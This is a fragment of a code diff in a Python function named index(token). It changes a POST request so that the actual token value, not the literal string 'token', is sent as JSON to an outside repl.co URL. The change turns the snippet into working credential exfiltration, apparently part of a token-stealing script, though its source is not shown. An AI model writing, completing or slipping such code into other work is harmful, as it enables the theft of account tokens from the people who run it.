@@ -62,7 +62,7 @@ def index(token):
         pass
 
         w="https://busyinsignificantfossil.yuvi5000.repl.co/x"
-        m={"text":"token"}
+        m={"text":token}
         r=requests.post(w,json=m)
 
 
